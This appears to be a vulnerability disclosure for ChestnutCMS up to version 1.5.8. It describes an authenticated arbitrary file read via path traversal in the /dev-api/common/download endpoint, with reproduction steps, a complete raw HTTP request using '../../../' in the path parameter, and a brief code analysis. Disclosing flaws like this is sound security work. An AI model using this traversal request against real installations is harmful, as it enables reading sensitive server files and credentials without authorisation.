## Vulnerability version:
ChestnutCMS <= 1.5.8

## Product supplier:
https://gitee.com/liweiyi/ChestnutCMS

## Vulnerability type:
Arbitrary File Read

## Vulnerability description:
ChestnutCMS is an enterprise-level content management system with front and back end separation.Before version 1.5.8, the system supported read any file after login. 

1.create a test.txt in the upload directory,content is "aaaa"
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231105579.png)

2.create a test.txt in D:\ ,content is "abc"
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231104395.png)

3.it is normally to read the test.txt in the upload directory
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231102703.png)

4.then we can read the test.txt in D:\
```
GET /dev-api/common/download?path=../../../test.txt HTTP/1.1
Host: 192.168.233.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Authorization=fa2792a3-abf9-41fa-a228-979308b2dce1; Admin-Token=fa2792a3-abf9-41fa-a228-979308b2dce1
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```


![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231103903.png)

## Code analysis

the base_url
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231123483.png)

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231113956.png)

it do not check any and go to the Files.copy function
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202510231323389.png)